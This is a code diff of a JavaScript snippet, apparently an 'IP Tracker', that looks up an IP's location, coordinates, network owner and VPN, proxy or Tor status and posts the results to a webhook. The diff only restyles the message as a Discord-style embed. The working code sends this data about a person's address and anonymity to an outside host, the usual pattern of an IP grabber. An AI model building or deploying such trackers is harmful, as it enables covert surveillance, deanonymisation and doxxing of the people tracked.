@@ -17,56 +17,54 @@
         })
         .then(res => res.json())
         .then(data => {
-            // Check if data structure matches expected fields
-            if (!data.data) {
-                throw new Error("Unexpected response structure");
-            }
-
+            if (!data.data) throw new Error("Unexpected response structure");
             const info = data.data;
 
-            const payload = {
-                content: `**IP Information:**\n` +
-                         `--------------------------\n` +
-                         `**IP Address:** ${info.ip || 'N/A'}\n` +
-                         `**Location:** ${info.city || 'N/A'}, ${info.region || 'N/A'}, ${info.country || 'N/A'}\n` +
-                         `**Coordinates:** ${info.loc || 'N/A'}\n` +
-                         `**Organization:** ${info.org || 'N/A'}\n\n` +
+            const embed = {
+                embeds: [{
+                    title: "🌍 IP Information",
+                    color: 3447003, // Blue color
+                    fields: [
+                        { name: "📌 IP Address", value: info.ip || 'N/A', inline: true },
+                        { name: "📍 Location", value: `${info.city || 'N/A'}, ${info.region || 'N/A'}, ${info.country || 'N/A'}`, inline: true },
+                        { name: "📌 Coordinates", value: info.loc || 'N/A', inline: true },
+                        { name: "🏢 Organization", value: info.org || 'N/A', inline: false },
 
-                         `**Network Details:**\n` +
-                         `--------------------------\n` +
-                         `**ASN:** ${info.asn?.asn || 'N/A'}\n` +
-                         `**ASN Name:** ${info.asn?.name || 'N/A'}\n` +
-                         `**ASN Domain:** ${info.asn?.domain || 'N/A'}\n` +
-                         `**ASN Route:** ${info.asn?.route || 'N/A'}\n` +
-                         `**ASN Type:** ${info.asn?.type || 'N/A'}\n\n` +
+                        { name: "🌐 Network Details", value: "-----------------", inline: false },
+                        { name: "📡 ASN", value: info.asn?.asn || 'N/A', inline: true },
+                        { name: "🏛️ ASN Name", value: info.asn?.name || 'N/A', inline: true },
+                        { name: "🔗 ASN Domain", value: info.asn?.domain || 'N/A', inline: true },
+                        { name: "🚀 ASN Route", value: info.asn?.route || 'N/A', inline: true },
+                        { name: "🖥️ ASN Type", value: info.asn?.type || 'N/A', inline: true },
 
-                         `**Company Details:**\n` +
-                         `--------------------------\n` +
-                         `**Company Name:** ${info.company?.name || 'N/A'}\n` +
-                         `**Company Domain:** ${info.company?.domain || 'N/A'}\n` +
-                         `**Company Type:** ${info.company?.type || 'N/A'}\n\n` +
+                        { name: "🏢 Company Details", value: "-----------------", inline: false },
+                        { name: "🏛️ Company Name", value: info.company?.name || 'N/A', inline: true },
+                        { name: "🔗 Company Domain", value: info.company?.domain || 'N/A', inline: true },
+                        { name: "💼 Company Type", value: info.company?.type || 'N/A', inline: true },
 
-                         `**Connection Type:**\n` +
-                         `--------------------------\n` +
-                         `**Anycast:** ${info.is_anycast || false}\n` +
-                         `**Mobile:** ${info.is_mobile || false}\n` +
-                         `**Anonymous:** ${info.is_anonymous || false}\n` +
-                         `**Satellite:** ${info.is_satellite || false}\n` +
-                         `**Hosting Service:** ${info.is_hosting || false}\n\n` +
+                        { name: "⚡ Connection Type", value: "-----------------", inline: false },
+                        { name: "🌎 Anycast", value: info.is_anycast ? "✅ Yes" : "❌ No", inline: true },
+                        { name: "📱 Mobile", value: info.is_mobile ? "✅ Yes" : "❌ No", inline: true },
+                        { name: "🎭 Anonymous", value: info.is_anonymous ? "✅ Yes" : "❌ No", inline: true },
+                        { name: "🛰️ Satellite", value: info.is_satellite ? "✅ Yes" : "❌ No", inline: true },
+                        { name: "🏢 Hosting Service", value: info.is_hosting ? "✅ Yes" : "❌ No", inline: true },
 
-                         `**Privacy Details:**\n` +
-                         `--------------------------\n` +
-                         `**Using VPN:** ${info.privacy?.vpn || false}\n` +
-                         `**Using Proxy:** ${info.privacy?.proxy || false}\n` +
-                         `**Using Tor:** ${info.privacy?.tor || false}\n` +
-                         `**Relay Enabled:** ${info.privacy?.relay || false}\n` +
-                         `**Hosting Provider:** ${info.privacy?.service || 'N/A'}`
+                        { name: "🔒 Privacy Details", value: "-----------------", inline: false },
+                        { name: "🛡️ Using VPN", value: info.privacy?.vpn ? "✅ Yes" : "❌ No", inline: true },
+                        { name: "🕵️ Using Proxy", value: info.privacy?.proxy ? "✅ Yes" : "❌ No", inline: true },
+                        { name: "🌐 Using Tor", value: info.privacy?.tor ? "✅ Yes" : "❌ No", inline: true },
+                        { name: "🔄 Relay Enabled", value: info.privacy?.relay ? "✅ Yes" : "❌ No", inline: true },
+                        { name: "📡 Hosting Provider", value: info.privacy?.service || 'N/A', inline: true }
+                    ],
+                    footer: { text: "IP Tracker | Data provided by ipinfo.io" },
+                    timestamp: new Date()
+                }]
             };
 
             return fetch(webhookURL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify(embed)
             });
         })
         .then(() => console.log("✅ IP Info Sent Successfully"))
